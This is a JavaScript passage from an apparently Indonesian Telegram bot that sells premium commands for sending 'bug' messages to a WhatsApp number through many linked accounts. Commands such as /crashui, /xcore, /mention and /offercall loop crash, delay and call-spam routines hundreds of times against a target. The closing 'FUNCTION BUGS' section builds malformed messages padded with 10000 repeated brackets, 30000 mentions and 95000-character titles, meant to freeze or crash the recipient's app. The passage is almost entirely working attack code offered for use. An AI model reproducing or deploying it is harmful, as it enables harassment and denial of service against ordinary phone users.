Progress: ${stage.bar}
\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    // ini tu logic kirim bug nya 
    let success = 0;
    let failed = 0;

    let repeatCount = {
      '1hours': 1
    }[commandName] || 1;
    
    for (const [botNum, Aii] of sessions.entries()) {
      try {
        if (!Aii.user || !Aii.ws.readyState === 1) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < repeatCount; i++) {
          await MaxInVsDelay(Aii, 22, jid);
        }

        success++;
      } catch (error) {
        failed++;
        console.log(error);
      }
    }

    // simpan cooldown per command
    cooldownData[commandName] = {
      lastUsed: now,
      cooldown
    };
    saveCooldownData(cooldownData);

    // ✅ Laporan akhir
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null, `\`\`\`js
╭──(   𝗟𝘂𝗳𝗳𝘆 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀   )
│ᨒ 𝖭𝖺𝗆𝖾 : ${ctx.from.username}
│ᨒ 𝖳𝗒𝗉𝖾 : ${tybepug}
│ᨒ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 3.0.0 (VIP)
│▬▭「 𝐃𝚯𝐍𝐄 」▭▬
│
│ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙍𝙚𝙥𝙤𝙧𝙩📣
│
│› Target: ${targetNumber}
│› Status: ✅ Selesai
│› Terkirim: ${success}
│› Gagal: ${failed}
│› Total Bot: ${sessions.size}
│
│› 2025-©Copyright GizzyyOfficial
╰───────────────────⬣\`\`\``,
      { parse_mode: "Markdown" }
    );
    
    console.log(chalk.green.bgHex("#e74c3c").bold(`[ ${tybepug} ] 🌜The bot has been summoned!🌛`));

  } catch (err) {
    await ctx.reply("❌ Terjadi kesalahan saat menjalankan serangan.");
    console.log(err);
  }
});

bot.command("albumess", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format: /albumess <628xxx>");
  }

  const targetNumber = args[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;
  const username = ctx.from.username ? `@${ctx.from.username}` : "unknown";

  // Deteksi command dan mapping ke Bug Type
  const fullCommand = ctx.message.text.split(" ")[0];
  const commandName = fullCommand.replace("/", "").toLowerCase();

  const bugTypeMap = {
    "albumess": "Delay-Album"
  };

  const tybepug = bugTypeMap[commandName] || "UNKNOWN";

  // ⏳ Cooldown per command
  const cooldownData = readCooldownData();
  const now = Date.now();
  const lastUsed = cooldownData[commandName]?.lastUsed || 0;
  const cooldown = cooldownData[commandName]?.cooldown || 60 * 1000;

  if (now - lastUsed < cooldown) {
    const timeLeft = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(`⚠️ *Cooldown*\nTunggu ${timeLeft} sebelum menggunakan command ini.`);
  }

  try {
    if (sessions.size === 0) {
      return ctx.reply("❌ Tidak ada bot WhatsApp yang terhubung. Gunakan /addbot terlebih dahulu.");
    }

    // progress awal
    const statusMessage = await ctx.replyWithMarkdown(`
\`\`\`css
(🍁) - G ⭑  𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Menyiapkan serangan ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ▱▱▱▱▱▱▱▱▱ 0%
\`\`\`
`);

    const progressStages = [
      { bar: "▰▱▱▱▱▱▱▱▱ 10%", delay: 500 },
      { bar: "▰▰▱▱▱▱▱▱▱ 30%", delay: 600 },
      { bar: "▰▰▰▱▱▱▱▱▱ 40%", delay: 500 },
      { bar: "▰▰▰▰▱▱▱▱▱ 50%", delay: 500 },
      { bar: "▰▰▰▰▰▱▱▱▱ 60%", delay: 600 },
      { bar: "▰▰▰▰▰▰▱▱▱ 70%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▱▱ 80%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▰▱ 90%", delay: 600 },
      { bar: "▰▰▰▰▰▰▰▰▰ 100%\n✅ Target ditemukan", delay: 1000 }
    ];

    for (const stage of progressStages) {
      await new Promise(r => setTimeout(r, stage.delay));
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMessage.message_id,
        null,
        `\`\`\`css
(🍁) - G ⭑ 𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Memulai pengiriman ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ${stage.bar}
\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    // ini tu logic kirim bug nya 
    let success = 0;
    let failed = 0;

    let repeatCount = {
      'albumess': 2
    }[commandName] || 1;
    
    for (const [botNum, Aii] of sessions.entries()) {
      try {
        if (!Aii.user || !Aii.ws.readyState === 1) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < repeatCount; i++) {
          await ForceXrimod(Aii, jid);
          await ForceXrimod(Aii, jid);
        }

        success++;
      } catch (error) {
        failed++;
        console.log(error);
      }
    }

    // simpan cooldown per command
    cooldownData[commandName] = {
      lastUsed: now,
      cooldown
    };
    saveCooldownData(cooldownData);

    // ✅ Laporan akhir
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null, `\`\`\`js
╭──(   𝗟𝘂𝗳𝗳𝘆 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀   )
│ᨒ 𝖭𝖺𝗆𝖾 : ${ctx.from.username}
│ᨒ 𝖳𝗒𝗉𝖾 : ${tybepug}
│ᨒ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 3.0.0 (VIP)
│▬▭「 𝐃𝚯𝐍𝐄 」▭▬
│
│ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙍𝙚𝙥𝙤𝙧𝙩📣
│
│› Target: ${targetNumber}
│› Status: ✅ Selesai
│› Terkirim: ${success}
│› Gagal: ${failed}
│› Total Bot: ${sessions.size}
│
│› 2025-©Copyright MarzzOfficial
╰───────────────────⬣\`\`\``,
      { parse_mode: "Markdown" }
    );
    
    console.log(chalk.green.bgHex("#e74c3c").bold(`[ ${tybepug} ] 🌜The bot has been summoned!🌛`));

  } catch (err) {
    await ctx.reply("❌ Terjadi kesalahan saat menjalankan serangan.");
    console.log(err);
  }
});

bot.command(["mention","delayinvis"], checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format: /commandnya <628xxx>");
  }

  const targetNumber = args[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;
  const username = ctx.from.username ? `@${ctx.from.username}` : "unknown";

  // Deteksi command dan mapping ke Bug Type
  const fullCommand = ctx.message.text.split(" ")[0];
  const commandName = fullCommand.replace("/", "").toLowerCase();

  const bugTypeMap = {
    mention: "mention delay",
    delayinvis: "invis delay"
  };

  const tybepug = bugTypeMap[commandName] || "UNKNOWN";

  // ⏳ Cooldown per command
  const cooldownData = readCooldownData();
  const now = Date.now();
  const lastUsed = cooldownData[commandName]?.lastUsed || 0;
  const cooldown = cooldownData[commandName]?.cooldown || 60 * 1000;

  if (now - lastUsed < cooldown) {
    const timeLeft = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(`⚠️ *Cooldown*\nTunggu ${timeLeft} sebelum menggunakan command ini.`);
  }

  try {
    if (sessions.size === 0) {
      return ctx.reply("❌ Tidak ada bot WhatsApp yang terhubung. Gunakan /addbot terlebih dahulu.");
    }

    // progress awal
    const statusMessage = await ctx.replyWithMarkdown(`
\`\`\`css
(🍁) - G ⭑  𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Menyiapkan serangan ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ▱▱▱▱▱▱▱▱▱ 0%
\`\`\`
`);

    const progressStages = [
      { bar: "▰▱▱▱▱▱▱▱▱ 10%", delay: 500 },
      { bar: "▰▰▱▱▱▱▱▱▱ 30%", delay: 600 },
      { bar: "▰▰▰▱▱▱▱▱▱ 40%", delay: 500 },
      { bar: "▰▰▰▰▱▱▱▱▱ 50%", delay: 500 },
      { bar: "▰▰▰▰▰▱▱▱▱ 60%", delay: 600 },
      { bar: "▰▰▰▰▰▰▱▱▱ 70%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▱▱ 80%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▰▱ 90%", delay: 600 },
      { bar: "▰▰▰▰▰▰▰▰▰ 100%\n✅ Target ditemukan", delay: 1000 }
    ];

    for (const stage of progressStages) {
      await new Promise(r => setTimeout(r, stage.delay));
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMessage.message_id,
        null,
        `\`\`\`css
(🍁) - G ⭑  𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Memulai pengiriman ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ${stage.bar}
\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    // ini tu logic kirim bug nya 
    let success = 0;
    let failed = 0;

    let repeatCount = {
      mention: 200,
      delayinvis: 100
    }[commandName] || 1;
    
    for (const [botNum, Aii] of sessions.entries()) {
      try {
        if (!Aii.user || !Aii.ws.readyState === 1) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < repeatCount; i++) {
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
        }

        success++;
      } catch (error) {
        failed++;
        console.log(error);
      }
    }

    // simpan cooldown per command
    cooldownData[commandName] = {
      lastUsed: now,
      cooldown
    };
    saveCooldownData(cooldownData);

    // ✅ Laporan akhir
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null, `\`\`\`js
╭──(  𝗟𝘂𝗳𝗳𝘆 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀   )
│ᨒ 𝖭𝖺𝗆𝖾 : ${ctx.from.username}
│ᨒ 𝖳𝗒𝗉𝖾 : ${tybepug}
│ᨒ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 3.0.0 (VIP)
│▬▭「 𝐃𝚯𝐍𝐄 」▭▬
│
│ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙍𝙚𝙥𝙤𝙧𝙩📣
│
│› Target: ${targetNumber}
│› Status: ✅ Selesai
│› Terkirim: ${success}
│› Gagal: ${failed}
│› Total Bot: ${sessions.size}
│
│› 2025-©Copyright MarzzOfficial
╰───────────────────⬣\`\`\``,
      { parse_mode: "Markdown" }
    );

    console.log(chalk.green.bgHex("#e74c3c").bold(`[ ${tybepug} ] 🌜The bot has been summoned!🌛`));

  } catch (err) {
    await ctx.reply("❌ Terjadi kesalahan saat menjalankan serangan.");
    console.log(err);
  }
});

bot.command(["attackui","crashui"], checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format: /commandnya <628xxx>");
  }

  const targetNumber = args[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;
  const username = ctx.from.username ? `@${ctx.from.username}` : "unknown";

  // Deteksi command dan mapping ke Bug Type
  const fullCommand = ctx.message.text.split(" ")[0];
  const commandName = fullCommand.replace("/", "").toLowerCase();

  const bugTypeMap = {
    attackui: "attackui-droid",
    crashui: "crash-ui"
  };

  const tybepug = bugTypeMap[commandName] || "UNKNOWN";

  // ⏳ Cooldown per command
  const cooldownData = readCooldownData();
  const now = Date.now();
  const lastUsed = cooldownData[commandName]?.lastUsed || 0;
  const cooldown = cooldownData[commandName]?.cooldown || 60 * 1000;

  if (now - lastUsed < cooldown) {
    const timeLeft = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(`⚠️ *Cooldown*\nTunggu ${timeLeft} sebelum menggunakan command ini.`);
  }

  try {
    if (sessions.size === 0) {
      return ctx.reply("❌ Tidak ada bot WhatsApp yang terhubung. Gunakan /addbot terlebih dahulu.");
    }

    // progress awal
    const statusMessage = await ctx.replyWithMarkdown(`
\`\`\`css
(🍁) - G ⭑  𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Menyiapkan serangan ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ▱▱▱▱▱▱▱▱▱ 0%
\`\`\`
`);

    const progressStages = [
      { bar: "▰▱▱▱▱▱▱▱▱ 10%", delay: 500 },
      { bar: "▰▰▱▱▱▱▱▱▱ 30%", delay: 600 },
      { bar: "▰▰▰▱▱▱▱▱▱ 40%", delay: 500 },
      { bar: "▰▰▰▰▱▱▱▱▱ 50%", delay: 500 },
      { bar: "▰▰▰▰▰▱▱▱▱ 60%", delay: 600 },
      { bar: "▰▰▰▰▰▰▱▱▱ 70%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▱▱ 80%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▰▱ 90%", delay: 600 },
      { bar: "▰▰▰▰▰▰▰▰▰ 100%\n✅ Target ditemukan", delay: 1000 }
    ];

    for (const stage of progressStages) {
      await new Promise(r => setTimeout(r, stage.delay));
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMessage.message_id,
        null,
        `\`\`\`css
(🍁) - G ⭑ 𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Memulai pengiriman ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ${stage.bar}
\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    // ini tu logic kirim bug nya 
    let success = 0;
    let failed = 0;

    let repeatCount = {
      attackui: 100,
      crashui: 100
    }[commandName] || 1;
    
    for (const [botNum, Aii] of sessions.entries()) {
      try {
        if (!Aii.user || !Aii.ws.readyState === 1) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < repeatCount; i++) {
          await trashinfinity(Aii, jid);
          await trashinfinity(Aii, jid);
          await trashinfinity(Aii, jid);
          await trashinfinity(Aii, jid);
          await trashinfinity(Aii, jid);
          await trashinfinity(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
          await zepdelayv4(Aii, jid);
        }

        success++;
      } catch (error) {
        failed++;
        console.log(error);
      }
    }

    // simpan cooldown per command
    cooldownData[commandName] = {
      lastUsed: now,
      cooldown
    };
    saveCooldownData(cooldownData);

    // ✅ Laporan akhir
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null, `\`\`\`js
╭──(   𝗟𝘂𝗳𝗳𝘆 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀   )
│ᨒ 𝖭𝖺𝗆𝖾 : ${ctx.from.username}
│ᨒ 𝖳𝗒𝗉𝖾 : ${tybepug}
│ᨒ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 3.0.0 (VIP)
│▬▭「 𝐃𝚯𝐍𝐄 」▭▬
│
│ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙍𝙚𝙥𝙤𝙧𝙩📣
│
│› Target: ${targetNumber}
│› Status: ✅ Selesai
│› Terkirim: ${success}
│› Gagal: ${failed}
│› Total Bot: ${sessions.size}
│
│› 2025-©Copyright MarzzOfficial
╰───────────────────⬣\`\`\``,
      { parse_mode: "Markdown" }
    );

    console.log(chalk.green.bgHex("#e74c3c").bold(`[ ${tybepug} ] 🌜The bot has been summoned!🌛`));

  } catch (err) {
    await ctx.reply("❌ Terjadi kesalahan saat menjalankan serangan.");
    console.log(err);
  }
});

bot.command(["xcore","xpaymnt"], checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format: /commandnya <628xxx>");
  }

  const targetNumber = args[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;
  const username = ctx.from.username ? `@${ctx.from.username}` : "unknown";

  // Deteksi command dan mapping ke Bug Type
  const fullCommand = ctx.message.text.split(" ")[0];
  const commandName = fullCommand.replace("/", "").toLowerCase();

  const bugTypeMap = {
    xcore: "x-core",
    xpaymnt: "xpayment"
  };

  const tybepug = bugTypeMap[commandName] || "UNKNOWN";

  // ⏳ Cooldown per command
  const cooldownData = readCooldownData();
  const now = Date.now();
  const lastUsed = cooldownData[commandName]?.lastUsed || 0;
  const cooldown = cooldownData[commandName]?.cooldown || 60 * 1000;

  if (now - lastUsed < cooldown) {
    const timeLeft = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(`⚠️ *Cooldown*\nTunggu ${timeLeft} sebelum menggunakan command ini.`);
  }

  try {
    if (sessions.size === 0) {
      return ctx.reply("❌ Tidak ada bot WhatsApp yang terhubung. Gunakan /addbot terlebih dahulu.");
    }

    // progress awal
    const statusMessage = await ctx.replyWithMarkdown(`
\`\`\`css
(🍁) - G ⭑ 𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Menyiapkan serangan ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ▱▱▱▱▱▱▱▱▱ 0%
\`\`\`
`);

    const progressStages = [
      { bar: "▰▱▱▱▱▱▱▱▱ 10%", delay: 500 },
      { bar: "▰▰▱▱▱▱▱▱▱ 30%", delay: 600 },
      { bar: "▰▰▰▱▱▱▱▱▱ 40%", delay: 500 },
      { bar: "▰▰▰▰▱▱▱▱▱ 50%", delay: 500 },
      { bar: "▰▰▰▰▰▱▱▱▱ 60%", delay: 600 },
      { bar: "▰▰▰▰▰▰▱▱▱ 70%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▱▱ 80%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▰▱ 90%", delay: 600 },
      { bar: "▰▰▰▰▰▰▰▰▰ 100%\n✅ Target ditemukan", delay: 1000 }
    ];

    for (const stage of progressStages) {
      await new Promise(r => setTimeout(r, stage.delay));
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMessage.message_id,
        null,
        `\`\`\`css
(🍁) - G ⭑ 𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Memulai pengiriman ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ${stage.bar}
\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    // ini tu logic kirim bug nya 
    let success = 0;
    let failed = 0;

    let repeatCount = {
      xcore: 50,
      xpaymnt: 70
    }[commandName] || 1;
    
    for (const [botNum, Aii] of sessions.entries()) {
      try {
        if (!Aii.user || !Aii.ws.readyState === 1) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < repeatCount; i++) {
          await InVsSwIphone(Aii, jid);
          await iNvsExTendIos(Aii, jid);
          await CrashIos(Aii, jid);
        }

        success++;
      } catch (error) {
        failed++;
        console.log(error);
      }
    }

    // simpan cooldown per command
    cooldownData[commandName] = {
      lastUsed: now,
      cooldown
    };
    saveCooldownData(cooldownData);

    // ✅ Laporan akhir
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null, `\`\`\`js
╭──(  𝗟𝘂𝗳𝗳𝘆 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀  )
│ᨒ 𝖭𝖺𝗆𝖾 : ${ctx.from.username}
│ᨒ 𝖳𝗒𝗉𝖾 : ${tybepug}
│ᨒ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 3.0.0 (VIP)
│▬▭「 𝐃𝚯𝐍𝐄 」▭▬
│
│ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙍𝙚𝙥𝙤𝙧𝙩📣
│
│› Target: ${targetNumber}
│› Status: ✅ Selesai
│› Terkirim: ${success}
│› Gagal: ${failed}
│› Total Bot: ${sessions.size}
│
│› 2025-©Copyright MarzzOfficial
╰───────────────────⬣\`\`\``,
      { parse_mode: "Markdown" }
    );

    console.log(chalk.green.bgHex("#e74c3c").bold(`[ ${tybepug} ] 🌜The bot has been summoned!🌛`));

  } catch (err) {
    await ctx.reply("❌ Terjadi kesalahan saat menjalankan serangan.");
    console.log(err);
  }
});

bot.command("offercall", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const targetNumber = args[1]?.replace(/[^0-9]/g, "");
  const message = args.slice(2).join(" ");

  if (!targetNumber) {
    return ctx.reply("Format: /payload <nomor_wa>");
  }
  const jid = `${targetNumber}@s.whatsapp.net`;

  const cooldownData = readCooldownData();
  const now = Date.now();
  const lastUsed = cooldownData.payload.lastUsed;
  const cooldown = cooldownData.payload.cooldown;

  if (now - lastUsed < cooldown) {
    const timeLeft = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu ${timeLeft} lagi sebelum menggunakan command bug.`
    );
  }

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await ctx.reply(
      `Mengirim pesan ke ${targetNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, Aii] of sessions.entries()) {
      try {
        if (!Aii.user || !Aii.ws.readyState === 1) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 200; i++) {
          await sendOfferCall(Aii, jid);
          await sendOfferVideoCall(Aii, jid);
        }

        successCount++;
      } catch (error) {
        failCount++;
        console.log(error);
      }
    }

    cooldownData.payload.lastUsed = now;
    saveCooldownData(cooldownData);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null, `
╭─────────────────
│    *HASIL PENGIRIMAN*    
│────────────────
│ Target: ${targetNumber}
│ Cooldown : ${timeLeft}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
╰─────────────────`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    await ctx.reply(
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

bot.command("force", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format: /force <628xxx>");
  }

  const targetNumber = args[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;
  const username = ctx.from.username ? `@${ctx.from.username}` : "unknown";

  // Deteksi command dan mapping ke Bug Type
  const fullCommand = ctx.message.text.split(" ")[0];
  const commandName = fullCommand.replace("/", "").toLowerCase();

  const bugTypeMap = {
    "force": "force"
  };

  const tybepug = bugTypeMap[commandName] || "UNKNOWN";

  // ⏳ Cooldown per command
  const cooldownData = readCooldownData();
  const now = Date.now();
  const lastUsed = cooldownData[commandName]?.lastUsed || 0;
  const cooldown = cooldownData[commandName]?.cooldown || 60 * 1000;

  if (now - lastUsed < cooldown) {
    const timeLeft = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(`⚠️ *Cooldown*\nTunggu ${timeLeft} sebelum menggunakan command ini.`);
  }

  try {
    if (sessions.size === 0) {
      return ctx.reply("❌ Tidak ada bot WhatsApp yang terhubung. Gunakan /addbot terlebih dahulu.");
    }

    // progress awal
    const statusMessage = await ctx.replyWithMarkdown(`
\`\`\`css
(🍁) - G ⭑  𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Menyiapkan serangan ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ▱▱▱▱▱▱▱▱▱ 0%
\`\`\`
`);

    const progressStages = [
      { bar: "▰▱▱▱▱▱▱▱▱ 10%", delay: 500 },
      { bar: "▰▰▱▱▱▱▱▱▱ 30%", delay: 600 },
      { bar: "▰▰▰▱▱▱▱▱▱ 40%", delay: 500 },
      { bar: "▰▰▰▰▱▱▱▱▱ 50%", delay: 500 },
      { bar: "▰▰▰▰▰▱▱▱▱ 60%", delay: 600 },
      { bar: "▰▰▰▰▰▰▱▱▱ 70%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▱▱ 80%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▰▱ 90%", delay: 600 },
      { bar: "▰▰▰▰▰▰▰▰▰ 100%\n✅ Target ditemukan", delay: 1000 }
    ];

    for (const stage of progressStages) {
      await new Promise(r => setTimeout(r, stage.delay));
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMessage.message_id,
        null,
        `\`\`\`css
(🍁) - G ⭑  𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Memulai pengiriman ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ${stage.bar}
\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    // ini tu logic kirim bug nya 
    let success = 0;
    let failed = 0;

    let repeatCount = {
      'force': 1
    }[commandName] || 1;
    
    for (const [botNum, Aii] of sessions.entries()) {
      try {
        if (!Aii.user || !Aii.ws.readyState === 1) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < repeatCount; i++) {
          await MaxInVsDelay(Aii, 22, jid);
        }

        success++;
      } catch (error) {
        failed++;
        console.log(error);
      }
    }

    // simpan cooldown per command
    cooldownData[commandName] = {
      lastUsed: now,
      cooldown
    };
    saveCooldownData(cooldownData);

    // ✅ Laporan akhir
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      null, `\`\`\`js
╭──(   𝗟𝘂𝗳𝗳𝘆 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀   )
│ᨒ 𝖭𝖺𝗆𝖾 : ${ctx.from.username}
│ᨒ 𝖳𝗒𝗉𝖾 : ${tybepug}
│ᨒ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 3.0.0 (VIP)
│▬▭「 𝐃𝚯𝐍𝐄 」▭▬
│
│ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙍𝙚𝙥𝙤𝙧𝙩📣
│
│› Target: ${targetNumber}
│› Status: ✅ Selesai
│› Terkirim: ${success}
│› Gagal: ${failed}
│› Total Bot: ${sessions.size}
│
│› 2025-©Copyright GizzyyOfficial
╰───────────────────⬣\`\`\``,
      { parse_mode: "Markdown" }
    );
    
    console.log(chalk.green.bgHex("#e74c3c").bold(`[ ${tybepug} ] 🌜The bot has been summoned!🌛`));

  } catch (err) {
    await ctx.reply("❌ Terjadi kesalahan saat menjalankan serangan.");
    console.log(err);
  }
});

// FUNCTION BUGS
const VisiXLoc = {
			key: {
				remoteJid: '13135550002@s.whatsapp.net',
				fromMe: false,
				participant: '13135550002@s.whatsapp.net',
				id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "call_permission_request",
						"paramsJson": `{`.repeat(10000),
						"version": 3
					}
				}
			}
		}
const dust = {
 key: {
  participant: "0@s.whatsapp.net",
  fromMe: false,
  remoteJid: "0@s.whatsapp.net",
  id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
 },
 message: {
   interactiveMessage: {
    header: {
     title: "꙳‌‌༑ᐧ ‌  .....   ‌⤻𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 .....  ꙳‌‌༑ᐧ"
    },
    body: {
     text: "🦠‌⃟꙳‌‌༑ᐧ 𝀽‌‌⃜𑱡 ‌   𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 ༑꙳‌⃟💚"
    },
    footer: {
     text: "🍷 hasclaw - execution"
    },
    nativeFlowMessage: {
     messageParamsJson: "[".repeat(10000),
     buttons: [{
         name: 'single_select',
         buttonParamsJson: ''
     }, {
         name: "call_permission_request",
         buttonParamsJson: '{"status":true}'
     }, {
         name: 'mpm',
         buttonParamsJson: '{"status":true}'
         }],
        }
     }
  }
}

async function CosmoApiDelay(Aii, target, mention = false) {
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "ꦽ".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Asep - Vann🫀",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
